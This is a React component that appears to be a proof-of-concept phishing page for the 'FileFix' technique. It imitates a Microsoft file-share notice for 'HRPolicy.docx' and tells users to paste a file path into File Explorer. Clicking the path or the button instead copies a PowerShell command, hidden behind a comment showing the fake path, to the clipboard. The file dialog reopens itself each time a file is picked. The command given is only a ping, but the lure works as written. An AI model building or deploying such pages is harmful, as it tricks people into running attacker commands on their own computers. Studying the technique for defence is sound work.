import React, { useRef, useEffect } from 'react';
import './testing.css';

const Testing = () => {
  const fileInputRef = useRef(null);
  const pathRef = useRef(null);

  useEffect(() => {
    const pathEl = pathRef.current;
    const fileInput = fileInputRef.current;

    const powershellCmd = `Powershell.exe -c ping example.com # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx`;

    const handlePathClick = () => {
      navigator.clipboard.writeText(powershellCmd);
      pathEl.classList.add('clicked');
    };

    const handleExplorerClick = () => {
      navigator.clipboard.writeText(powershellCmd);
      fileInput.click();
    };

    const handleFileChange = () => {
      alert("Please follow the stated instructions.");
      fileInput.value = "";
      setTimeout(() => fileInput.click(), 500);
    };

    pathEl.addEventListener('click', handlePathClick);
    fileInput.addEventListener('change', handleFileChange);

    // Clean up listeners
    return () => {
      pathEl.removeEventListener('click', handlePathClick);
      fileInput.removeEventListener('change', handleFileChange);
    };
  }, []);

  return (
    <div className="container">
      <div className="header">
        <svg fill="#000000" width="50px" height="50px" viewBox="0 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg">
          <path d="M0 25.472q0 2.368 1.664 4.032t4.032 1.664h18.944q2.336 0 4-1.664t1.664-4.032v-8.192l-3.776 3.168v5.024q0 0.8-0.544 1.344t-1.344 0.576h-18.944q-0.8 0-1.344-0.576t-0.544-1.344v-18.944q0-0.768 0.544-1.344t1.344-0.544h9.472v-3.776h-9.472q-2.368 0-4.032 1.664t-1.664 4v18.944zM5.696 19.808q0 2.752 1.088 5.28 0.512-2.944 2.24-5.344t4.288-3.872 5.632-1.664v5.6l11.36-9.472-11.36-9.472v5.664q-2.688 0-5.152 1.056t-4.224 2.848-2.848 4.224-1.024 5.152zM32 22.080v0 0 0z"></path>
        </svg>
        <h2>mr.d0x made "HRPolicy.docx" available to you</h2>
        <div className="timestamp">06/20/2025 10:22:45 AM</div>
      </div>

      <div className="instructions">
        <p>To access <strong>HRPolicy.docx</strong>, follow these steps:</p>
        <ol>
          <li style={{ marginBottom: '10px' }}>
            Copy the file path below
            <div className="code-block" ref={pathRef}>
              C:\company\internal-secure\filedrive\HRPolicy.docx
            </div>
          </li>
          <li style={{ marginBottom: '10px' }}>
            Open File Explorer and select the address bar (<strong>CTRL + L</strong>)
          </li>
          <li style={{ marginBottom: '10px' }}>
            Paste the file path and press <strong>Enter</strong>
          </li>
        </ol>
      </div>

      <input type="file" ref={fileInputRef} style={{ display: 'none' }} />
      <button onClick={() => fileInputRef.current.click()} id="fileExplorer">Open File Explorer</button>

      <div className="footer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" />
      </div>
    </div>
  );
};

export default Testing;
